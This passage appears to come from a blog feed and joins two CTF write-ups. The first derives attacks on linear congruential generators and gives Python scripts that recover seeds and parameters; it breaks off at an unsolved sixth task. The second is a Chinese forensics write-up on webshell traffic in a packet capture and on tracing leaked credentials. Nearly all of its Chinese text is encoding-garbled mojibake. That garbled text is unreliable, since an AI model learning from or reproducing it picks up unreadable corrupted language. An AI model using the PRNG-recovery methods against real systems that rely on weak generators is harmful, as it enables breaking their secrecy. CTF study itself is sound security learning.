<h2 id="formula-3"><a href="#formula-3" class="headerlink" title="formula 3"></a>formula 3</h2><p>$$<br>X_{n + 1} \equiv aX_{n} + b \mod m<br>$$</p>
<p>$$<br>b \equiv X_{n+1} - aX_{n} \mod m<br>$$</p>
<h2 id="formula-4"><a href="#formula-4" class="headerlink" title="formula 4"></a>formula 4</h2><p>Define that $t_n \equiv X_{n +1} - X_{n} \mod m$.<br>$$<br>t_n \equiv (aX_{n} + b) - (aX_{n-1} + b) \mod m<br>$$</p>
<p>$$<br>t_n \equiv a(X_{n} - X_{n-1}) \mod m<br>$$</p>
<p>$$<br>\Longrightarrow t_n \equiv at_{n-1} \mod m<br>$$</p>
<p>Thus, we can make the deduction by followings.<br>$$<br>t_{n+1}\cdot t_{n-1} - t_{n}\cdot t_{n} \mod m<br>$$</p>
<p>$$<br>\rightarrow a\cdot t_{n} \cdot a^{-1} \cdot t_{n} - t_n\cdot t_n \mod m<br>$$</p>
<p>$$<br>\Longrightarrow 0 \mod m<br>$$</p>
<p>$$<br>\Longrightarrow t_{n+1}\cdot t_{n-1} - t_{n}\cdot t_{n} | m<br>$$</p>
<p>Similarly, it can be concluded that $t_{n}\cdot t_{n-2} - t_{n-1}\cdot t_{n-1} | m$<br>$$<br>\Longrightarrow m &#x3D; gcd ((t_{n+1}\cdot t_{n-1} - t_{n}\cdot t_{n}), (t_{n}\cdot t_{n-2} - t_{n-1}\cdot t_{n-1}))<br>$$</p>
<h1 id="Applications"><a href="#Applications" class="headerlink" title="Applications"></a>Applications</h1><h2 id="lcg-1"><a href="#lcg-1" class="headerlink" title="lcg_1"></a>lcg_1</h2><h3 id="task"><a href="#task" class="headerlink" title="task"></a>task</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;***********************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">b = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">seed = <span class="number">33477128523140105764301644224721378964069</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;seed = &quot;</span>,seed)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">ciphertext = seed^plaintext</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a = &quot;</span>,a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b = &quot;</span>,b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &quot;</span>,ciphertext)</span><br></pre></td></tr></table></figure>

<h3 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h3><p><strong>known:</strong> </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">seed = (a * seed + b) % n</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">n</span><br><span class="line">---<span class="number">10</span>---&gt; seed</span><br><span class="line">ciphertext = seed ^ plaintext</span><br><span class="line"></span><br><span class="line">=&gt; plaintext = ciphertext ^ seed</span><br></pre></td></tr></table></figure>

<p><strong>exp:</strong> </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">seed = </span><br><span class="line">a = </span><br><span class="line">b = </span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed + b) % n</span><br><span class="line">plaintext = seed ^ c</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(plaintext))</span><br></pre></td></tr></table></figure>

<h2 id="lcg-2"><a href="#lcg-2" class="headerlink" title="lcg_2"></a>lcg_2</h2><h3 id="task-1"><a href="#task-1" class="headerlink" title="task"></a>task</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;*****************************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">b = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">seed = plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">ciphertext = seed</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a = &quot;</span>,a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b = &quot;</span>,b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &quot;</span>,ciphertext)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="solution-1"><a href="#solution-1" class="headerlink" title="solution"></a>solution</h3><p><strong>known:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">seed = plaintext</span><br><span class="line">seed = (a * seed + b) % n</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">n</span><br><span class="line">---<span class="number">10</span>---&gt; seed</span><br><span class="line">ciphertext = seed</span><br><span class="line"></span><br><span class="line">use formula <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><strong>exp:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a_ = invert(a, n)</span><br><span class="line"></span><br><span class="line">seed = c</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a_ * (seed - b)) % n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(seed))</span><br></pre></td></tr></table></figure>



<h2 id="lcg-3"><a href="#lcg-3" class="headerlink" title="lcg_3"></a>lcg_3</h2><h3 id="task-2"><a href="#task-2" class="headerlink" title="task"></a>task</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;*********************&#125;&#x27;</span></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">seed = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">b = plaintext</span><br><span class="line"></span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">    output.append(seed)</span><br><span class="line">ciphertext = seed</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a = &quot;</span>,a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;output1 = &quot;</span>,output[<span class="number">6</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;output2 = &quot;</span>,output[<span class="number">7</span>])</span><br></pre></td></tr></table></figure>

<h3 id="solution-2"><a href="#solution-2" class="headerlink" title="solution"></a>solution</h3><p><strong>known:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a</span><br><span class="line">n</span><br><span class="line">output = (a * seed + b) % n</span><br><span class="line">	-&gt; output1 = output[<span class="number">6</span>]</span><br><span class="line">	-&gt; output2 = output[<span class="number">7</span>]</span><br><span class="line">b = plaintext</span><br></pre></td></tr></table></figure>

<p><strong>exp:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># formula 3</span></span><br><span class="line">b = (output2 - a*output1) % n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(b))</span><br></pre></td></tr></table></figure>



<h2 id="lcg-4"><a href="#lcg-4" class="headerlink" title="lcg_4"></a>lcg_4</h2><h3 id="task-3"><a href="#task-3" class="headerlink" title="task"></a>task</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;********************************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">b = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">seed = plaintext</span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">    output.append(seed)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;output = &quot;</span>,output)</span><br></pre></td></tr></table></figure>

<h3 id="solution-3"><a href="#solution-3" class="headerlink" title="solution"></a>solution</h3><p><strong>known:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n</span><br><span class="line">seed = (a * seed + b) % n   ---&gt; output</span><br></pre></td></tr></table></figure>

<p><strong>target:</strong> </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">to solve out a, b</span><br><span class="line">a  &lt;---  formula <span class="number">2</span></span><br><span class="line">b  &lt;---  formula <span class="number">3</span></span><br></pre></td></tr></table></figure>



<p><strong>exp:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># solve out a</span></span><br><span class="line">a = invert(output[<span class="number">1</span>] - output[<span class="number">0</span>], n) * (output[<span class="number">2</span>] - output[<span class="number">1</span>]) % n</span><br><span class="line">a_ = invert(a, n)</span><br><span class="line"><span class="comment"># solve out b</span></span><br><span class="line">b = (output[<span class="number">1</span>] - a * output[<span class="number">0</span>]) % n</span><br><span class="line"><span class="comment"># solve out the initial seed</span></span><br><span class="line">plaintext = a_ * (output[<span class="number">0</span>] - b) % n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(plaintext))</span><br></pre></td></tr></table></figure>



<h2 id="lcg-5"><a href="#lcg-5" class="headerlink" title="lcg_5"></a>lcg_5</h2><h3 id="task-4"><a href="#task-4" class="headerlink" title="task"></a>task</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;****************************************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">b = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">seed = plaintext</span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">    output.append(seed)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;output = &quot;</span>,output)</span><br></pre></td></tr></table></figure>



<h3 id="solution-4"><a href="#solution-4" class="headerlink" title="solution"></a>solution</h3><p><strong>known:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">seed = (a * seed + b) % n   ---&gt; output</span><br></pre></td></tr></table></figure>

<p><strong>target:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">to solve out a, b, m</span><br><span class="line"></span><br><span class="line">m  &lt;--- formula <span class="number">4</span></span><br><span class="line">a  &lt;--- formula <span class="number">2</span></span><br><span class="line">b  &lt;--- formula <span class="number">3</span></span><br></pre></td></tr></table></figure>

<p><strong>exp:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># solve out n</span></span><br><span class="line">t = [output[i + <span class="number">1</span>] - output[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output) - <span class="number">1</span>)]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">return</span> t[i + <span class="number">1</span>] * t[i - <span class="number">1</span>] - t[i] * t[i]</span><br><span class="line"></span><br><span class="line">ns = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output) - <span class="number">3</span>):</span><br><span class="line">    ns.append(<span class="built_in">int</span>(gcd(T(i), T(i+<span class="number">1</span>))))</span><br><span class="line">    <span class="comment"># print(ns)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> ns:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># solve out a</span></span><br><span class="line">        a = invert(output[<span class="number">1</span>] - output[<span class="number">0</span>], n) * (output[<span class="number">2</span>] - output[<span class="number">1</span>]) % n</span><br><span class="line">        a_ = invert(a, n)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># solve out b</span></span><br><span class="line">        b = (output[<span class="number">1</span>] - a * output[<span class="number">0</span>]) % n</span><br><span class="line"></span><br><span class="line">        <span class="comment"># solve out the initial seed</span></span><br><span class="line">        plaintext = a_ * (output[<span class="number">0</span>] - b) % n</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(plaintext))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>



<h2 id="lcg-6"><a href="#lcg-6" class="headerlink" title="lcg_6"></a>lcg_6</h2><h3 id="task-5"><a href="#task-5" class="headerlink" title="task"></a>task</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;*****************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">b = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">seed = plaintext</span><br><span class="line"></span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (seed*a+b)%n</span><br><span class="line">    output.append(seed&gt;&gt;<span class="number">64</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a = &quot;</span>,a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b = &quot;</span>,b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;output = &quot;</span>,output)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>lcg</tag>
        <tag>recursion</tag>
      </tags>
  </entry>
  <entry>
    <title>MISC-Write-Up-Zh</title>
    <url>/2023/03/09/MISC-Write-Up-zh/</url>
    <content><![CDATA[<p>As a routine notepad to record some recurrent tasks in Chinese.</p>
<p>These tasks are somewhat special or interesting, which deserve recording. </p>
<span id="more"></span><!--toc-->

<h1 id="2022é¦–å±Šæ•°æ®å®‰å…¨å¤§èµ›-SQLPacket"><a href="#2022é¦–å±Šæ•°æ®å®‰å…¨å¤§èµ›-SQLPacket" class="headerlink" title="[2022é¦–å±Šæ•°æ®å®‰å…¨å¤§èµ›]SQLPacket"></a>[2022é¦–å±Šæ•°æ®å®‰å…¨å¤§èµ›]SQLPacket</h1><h2 id="SQLPacket-1"><a href="#SQLPacket-1" class="headerlink" title="SQLPacket.1"></a>SQLPacket.1</h2><p><strong>é¢˜å¹²ä¿¡æ¯ï¼š</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230814103402110.png" class="" title="image-20230814103402110">

<p><strong>è§£é¢˜ï¼š</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230814110938970.png" class="" title="image-20230814110938970">

<p>è¿½è¸ªçš„è·¯å¾„ï¼š</p>
<ul>
<li>åè®®åˆ†çº§ï¼Œå®šä½<code>http</code></li>
<li>æŸ¥çœ‹å¯¹è±¡ï¼Œ<code>HTTP</code>ï¼Œå‘ç°å­˜åœ¨<code>cmd=ls</code>ç­‰ä¿¡æ¯</li>
<li>è¿‡æ»¤æ•°æ®ï¼Œ<code>http contains &quot;cmd=ls&quot;</code></li>
<li>å³å‡»è¿‡æ»¤HTTPæµ</li>
<li>å‘ç°<code>secret1687456.txt</code></li>
</ul>
<h2 id="SQLPacket-2"><a href="#SQLPacket-2" class="headerlink" title="SQLPacket.2"></a>SQLPacket.2</h2><p><strong>é¢˜å¹²ä¿¡æ¯ï¼š</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230814111422124.png" class="" title="image-20230814111422124">

<p><strong>è§£å¯†ï¼š</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230814134745903.png" class="" title="image-20230814134745903">

<ul>
<li>urlè§£ç </li>
<li>base64è§£å¯†</li>
</ul>
<p>å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230814135224798.png" class="" title="image-20230814135224798">

<p>å¯å¾—ï¼Œå¯†é’¥ä¸º<code>05c1cc9c2deafb75</code>ï¼Œé‡‡ç”¨<code>AES128</code>åŠ å¯†ã€‚</p>
<p>åˆ°tq 197ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230814135834691.png" class="" title="image-20230814135834691">

<ul>
<li>AESè§£å¯†</li>
<li>base64è§£ç </li>
</ul>
<p>å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230814135946111.png" class="" title="image-20230814135946111">

<p>è¿½è¸ªHTTPæµï¼Œä½¿ç”¨è¿”å›åŒ…è¿›è¡Œæ±‚è§£ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230814140206008.png" class="" title="image-20230814140206008">

<p><em>ç›´æ¥åœ¨notepad++ä¸­è¿›è¡Œè½¬æ¢</em></p>
<ul>
<li>base64è§£ç </li>
<li>hex -&gt; ascii è½¬æ¢</li>
</ul>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230814140513980.png" class="" title="image-20230814140513980">

<p>ä»è€Œå¾—åˆ°<code>secret1</code>ï¼Œå³ä¸º<code>ae1690a2-8e67-421e-bdcd-c4510995da98</code>ã€‚</p>
<h1 id="2022é¦–å±Šæ•°æ®å®‰å…¨å¤§èµ›-è´¦å¯†æ³„å¯†è¿½è¸ª"><a href="#2022é¦–å±Šæ•°æ®å®‰å…¨å¤§èµ›-è´¦å¯†æ³„å¯†è¿½è¸ª" class="headerlink" title="[2022é¦–å±Šæ•°æ®å®‰å…¨å¤§èµ›]è´¦å¯†æ³„å¯†è¿½è¸ª"></a>[2022é¦–å±Šæ•°æ®å®‰å…¨å¤§èµ›]è´¦å¯†æ³„å¯†è¿½è¸ª</h1><img src="/2023/03/09/MISC-Write-Up-zh/image-20230808132623943.png" class="" title="image-20230808132623943">

<h2 id="è´¦å¯†æ³„å¯†è¿½è¸ª-1"><a href="#è´¦å¯†æ³„å¯†è¿½è¸ª-1" class="headerlink" title="è´¦å¯†æ³„å¯†è¿½è¸ª.1"></a>è´¦å¯†æ³„å¯†è¿½è¸ª.1</h2><p><strong>é¢˜å¹²ä¿¡æ¯ï¼š</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808132730673.png" class="" title="image-20230808132730673">

<p><strong>è§£é¢˜ï¼š</strong></p>
<p>ç›´æ¥åœ¨GitHubä¸Šæœç´¢<code>green berry</code>ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808132934566.png" class="" title="image-20230808132934566">

<p>è¿›å…¥é¡¹ç›®ä¸­ï¼Œä½¿ç”¨æ³„éœ²çš„äº”ä¸ªè´¦å·ä¾æ¬¡æŸ¥æ‰¾ï¼Œä»è€Œæ‰¾åˆ°äº†æ³„éœ²æ–‡ä»¶ä½ç½®ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808133348918.png" class="" title="image-20230808133348918">

<p>è¯¥urlä¸º<code>https://github.com/Tristan-Hao/Green-Berry/blob/main/scrubbers.py</code>ã€‚</p>
<h2 id="è´¦å¯†æ³„å¯†è¿½è¸ª-2"><a href="#è´¦å¯†æ³„å¯†è¿½è¸ª-2" class="headerlink" title="è´¦å¯†æ³„å¯†è¿½è¸ª.2"></a>è´¦å¯†æ³„å¯†è¿½è¸ª.2</h2><p><strong>é¢˜å¹²ä¿¡æ¯ï¼š</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808134339166.png" class="" title="image-20230808134339166">

<p><strong>è§£é¢˜ï¼š</strong></p>
<p>å› ä¸ºåœ¨giteeå¹³å°ï¼Œåˆ©ç”¨<code>qingmei</code>è¿›è¡ŒæŸ¥æ‰¾ï¼Œå‘ç°è¯¥é¡¹ç›®ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808134528131.png" class="" title="image-20230808134528131">

<p>è¿›å…¥é¡¹ç›®ï¼Œè¿›è¡ŒæŸ¥æ‰¾ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808134847640.png" class="" title="image-20230808134847640">

<p>è¯¥urlä¸º<code>https://gitee.com/datasecurity-qunzhong/qing-mei-login/blob/master/scrubbers.py</code>ã€‚</p>
<h2 id="è´¦å¯†æ³„å¯†è¿½è¸ª-3"><a href="#è´¦å¯†æ³„å¯†è¿½è¸ª-3" class="headerlink" title="è´¦å¯†æ³„å¯†è¿½è¸ª.3"></a>è´¦å¯†æ³„å¯†è¿½è¸ª.3</h2><p><strong>é¢˜å¹²ä¿¡æ¯ï¼š</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808135119209.png" class="" title="image-20230808135119209">

<p><strong>è§£é¢˜ï¼š</strong></p>
<p>å‡¡æ˜¯è¿˜å¾—ç™»å½•ä»¥åŠå¿…é¡»æ‰‹æœºå·æ³¨å†Œçš„ä¸œè¥¿ï¼Œæˆ‘å‘Šè¾ã€‚</p>
<p>ç½‘ä¸Šæˆªå›¾ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808140304612.png" class="" title="image-20230808140304612">

<p>ä»¥åŠè¯†åˆ«urlåå¾—åˆ°<code>https://www.yuque.com/shuanxiaoming/gsx1eb/efnpu3</code>ã€‚</p>
<h2 id="è´¦å¯†æ³„å¯†è¿½è¸ª-4"><a href="#è´¦å¯†æ³„å¯†è¿½è¸ª-4" class="headerlink" title="è´¦å¯†æ³„å¯†è¿½è¸ª.4"></a>è´¦å¯†æ³„å¯†è¿½è¸ª.4</h2><p><strong>é¢˜å¹²ä¿¡æ¯ï¼š</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808140927064.png" class="" title="image-20230808140927064">

<p><strong>è§£å¯†ï¼š</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808141004301.png" class="" title="image-20230808141004301">

<p>å¾—åˆ°æ³„éœ²urlï¼Œ<code>https://zhuanlan.zhihu.com/p/521587651</code>ã€‚</p>
<h2 id="è´¦å¯†æ³„éœ²è¿½è¸ª-5"><a href="#è´¦å¯†æ³„éœ²è¿½è¸ª-5" class="headerlink" title="è´¦å¯†æ³„éœ²è¿½è¸ª.5"></a>è´¦å¯†æ³„éœ²è¿½è¸ª.5</h2><p><strong>é¢˜å¹²ä¿¡æ¯ï¼š</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808141435317.png" class="" title="image-20230808141435317">

<p><strong>è§£é¢˜ï¼š</strong></p>
<p>åœ¨CSDNä¸Šï¼Œåˆ©ç”¨å…³é”®è¯<code>é’è“</code>è¿›è¡ŒæŸ¥æ‰¾ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808141713409.png" class="" title="image-20230808141713409">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808141920605.png" class="" title="image-20230808141920605">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808141638834.png" class="" title="image-20230808141638834">

<p>å¾—åˆ°ä¸¤ä¸ªæ³„éœ²urlã€‚</p>
<h1 id="2022é¦–å±Šæ•°æ®å®‰å…¨å¤§èµ›-æ³„éœ²æº¯æºå®šä½"><a href="#2022é¦–å±Šæ•°æ®å®‰å…¨å¤§èµ›-æ³„éœ²æº¯æºå®šä½" class="headerlink" title="[2022é¦–å±Šæ•°æ®å®‰å…¨å¤§èµ›]æ³„éœ²æº¯æºå®šä½"></a>[2022é¦–å±Šæ•°æ®å®‰å…¨å¤§èµ›]æ³„éœ²æº¯æºå®šä½</h1><img src="/2023/03/09/MISC-Write-Up-zh/image-20230808102637362.png" class="" title="image-20230808102637362">

<h2 id="æ³„éœ²æº¯æºå®šä½-1"><a href="#æ³„éœ²æº¯æºå®šä½-1" class="headerlink" title="æ³„éœ²æº¯æºå®šä½.1"></a>æ³„éœ²æº¯æºå®šä½.1</h2><p><strong>é¢˜å¹²ä¿¡æ¯ï¼š</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808103702696.png" class="" title="image-20230808103702696">

<p><strong>è§£é¢˜ï¼š</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808103026443.png" class="" title="image-20230808103026443">

<p>è¿™ä¸ªæµç›¸å¯¹è¾ƒå¤§ï¼Œå†åŠ ä¸Šå¯Ÿè§‰åˆ°mysqlçš„æˆæƒä»¥åŠæŸ¥çœ‹åˆ°åç»­å­˜åœ¨éšç§ä¿¡æ¯ï¼Œæ‰€ä»¥åŸºæœ¬å®šä½è¯¥æµä¸ºå…³é”®æµã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808103352640.png" class="" title="image-20230808103352640">

<p>æ‰€ä»¥å®šä½è¯¥ç”¨æˆ·åº”è¯¥ä¸º<code>dataUser3</code>ã€‚</p>
<h2 id="æ³„éœ²æº¯æºå®šä½-2"><a href="#æ³„éœ²æº¯æºå®šä½-2" class="headerlink" title="æ³„éœ²æº¯æºå®šä½.2"></a>æ³„éœ²æº¯æºå®šä½.2</h2><p><strong>é¢˜å¹²ä¿¡æ¯ï¼š</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808103812434.png" class="" title="image-20230808103812434">

<p><strong>è§£é¢˜ï¼š</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808104114792.png" class="" title="image-20230808104114792">

<p>ç‚¹è¿›å»å¾—åˆ°ç½‘å€ï¼š</p>
<p><code>https://github.com/Tristan-Hao/Green-Berry/blob/f766064e4f9c38bf4aefa06fd3d4abbda7fe4914/catalogue.py</code></p>
<p>æ‰€ä»¥æäº¤å³å¯ã€‚</p>
<h2 id="æ³„éœ²æº¯æºå®šä½-3"><a href="#æ³„éœ²æº¯æºå®šä½-3" class="headerlink" title="æ³„éœ²æº¯æºå®šä½.3"></a>æ³„éœ²æº¯æºå®šä½.3</h2><p><strong>é¢˜å¹²ä¿¡æ¯ï¼š</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808104441950.png" class="" title="image-20230808104441950">

<p><strong>è§£é¢˜ï¼š</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808104724692.png" class="" title="image-20230808104724692">

<p>å¦‚æœæ— æ³•å®šä½å…·ä½“ä½¿ç”¨çš„æ•°å€¼æ˜¯ä»€ä¹ˆï¼Œé‚£å›å½’æ•°æ®åŒ…è¿›è¡ŒæŸ¥çœ‹ã€‚åˆ©ç”¨è¯¦æƒ…ç•Œé¢çš„å€¼å½“ä½œå¯†æ–‡è¿›è¡Œè§£å¯†ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808154128946.png" class="" title="image-20230808154128946">

<p>æ ¹æ®å¯†æ–‡åˆ¤æ–­é‡‡ç”¨çš„è§£å¯†ç±»å‹ï¼Œå‘ç°åº”å½“æ˜¯<code>AES</code>ï¼Œä¸”å¯†é’¥æ˜¯<code>aa01</code>ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808111111322.png" class="" title="image-20230808111111322">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808111237576.png" class="" title="image-20230808111237576">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808111333780.png" class="" title="image-20230808111333780">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808111510335.png" class="" title="image-20230808111510335">

